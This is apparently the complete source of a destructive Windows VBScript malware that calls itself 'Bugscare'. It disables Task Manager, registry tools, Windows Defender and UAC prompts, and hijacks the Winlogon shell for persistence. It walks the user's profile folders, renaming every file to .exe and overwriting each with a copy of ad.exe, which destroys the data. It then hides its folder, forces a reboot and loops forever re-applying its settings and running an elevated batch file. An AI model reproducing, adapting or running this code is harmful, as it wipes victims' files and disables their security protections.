set x = createobject("Wscript.shell")
set c = createobject("Scripting.FilesystemObject")
set objShell = createobject("Shell.Application")
on error resume next

'####################################################################
dim userad
userad=x.EXpandEnvironmentStrings("%USERNAME%")

if c.FileExists("C:\bug32\fst.msi") then
else
x.run "wmplayer.exe"
x.RegWrite"HKCU\SOFTWARE\Policies\Microsoft\Windows\System\DisableCMD","0","REG_DWORD"
x.RegWrite"HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\DisableTaskMgr","1","REG_DWORD"
x.RegWrite"HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\DisableRegistrytools","1","REG_DWORD"
x.RegWrite"HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoWinKeys","1","REG_DWORD"
x.RegWrite"HKLM\Software\Policies\Microsoft\windows defender\disableantispyware","1","REG_DWORD"
x.RegWrite"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin","0","REG_DWORD"
x.RegWrite"HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\wallpaper","C:\bug32\whitescr.png","REG_SZ"
x.RegWrite"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell","explorer.exe, wscript.exe ""C:\bug32\runner.vbs""","REG_SZ"
x.RegWrite"HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ActiveDesktop\NoChangingWallpaper","1","REG_DWORD"
x.RegWrite"HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\DisableTaskMgr","1","REG_DWORD"
x.RegWrite"HKCU\Control Panel\Cursors\Arrow","C:\bug32\bx.cur","REG_SZ"
x.RegWrite"HKCU\Control Panel\Cursors\AppStarting","C:\bug32\bx.cur","REG_SZ"
x.RegWrite"HKCU\Control Panel\Cursors\Hand","C:\bug32\bx.cur","REG_SZ"
x.RegWrite"HKCR\exefile\DefaultIcon\","C:\Bug32\icon.ico","REG_SZ"
c.CreateTextFile"C:\BUG32\fst.msi"



x.run "cmd.exe /c dir ""%userprofile%\"" /s/b/o:n/a:d > ""C:\BUG32\list.lnk"" & echo :ok:>>""C:\bug32\list.lnk""",0
wscript.sleep 2000
set red=c.OpenTextfile("C:\bug32\list.lnk")
dim nue
for a=1 to 20
a=3
nue=red.ReadLine
if nue=":ok:" then
x.RegWrite"HKCU\SOFTWARE\Policies\Microsoft\Windows\System\DisableCMD","2","REG_DWORD"

x.run "shutdown.exe -r -t 05",0
x.run "attrib.exe +h ""C:\BUG32""",0
msgbox"Umm.. Well. Your Computer Has Been Infected by Bugscare.exe",1+16,"aferim"
wscript.quit
else
x.run "cmd.exe /c ren """&nue&"\*.*"" ""*.exe""",0
wscript.sleep 10
Set folder = c.GetFolder(""&nue&"\")
Set files = folder.Files
  For Each file in files
c.CopyFile"C:\BUG32\ad.exe", ""&nue&"\"&file.name&""
next

end if
next
wscript.sleep 5000

end if
dim dongu
dongu=0
do

x.RegWrite"HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\DisableTaskMgr","1","REG_DWORD"
x.RegWrite"HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\DisableRegistrytools","1","REG_DWORD"
x.RegWrite"HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoWinKeys","1","REG_DWORD"
x.RegWrite"HKLM\Software\Policies\Microsoft\windows defender\disableantispyware","1","REG_DWORD"
x.RegWrite"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin","0","REG_DWORD"
x.RegWrite"HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\wallpaper","C:\bug32\whitescr.png","REG_SZ"
x.RegWrite"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell","explorer.exe, wscript.exe ""C:\bug32\runner.vbs""","REG_SZ"
x.RegWrite"HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ActiveDesktop\NoChangingWallpaper","1","REG_DWORD"
x.RegWrite"HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\DisableTaskMgr","1","REG_DWORD"
x.RegWrite"HKCU\Control Panel\Cursors\Arrow","C:\bug32\bx.cur","REG_SZ"
x.RegWrite"HKCU\Control Panel\Cursors\AppStarting","C:\bug32\bx.cur","REG_SZ"
x.RegWrite"HKCU\Control Panel\Cursors\Hand","C:\bug32\bx.cur","REG_SZ"
x.RegWrite"HKCR\exefile\DefaultIcon\","C:\Bug32\icon.ico","REG_SZ"
wscript.sleep 2000
dongu = dongu + 1


if dongu = 6 then
dongu =0
objshell.shellexecute"C:\BUG32\Kill.bat",,,"runas",0  
end if




loop
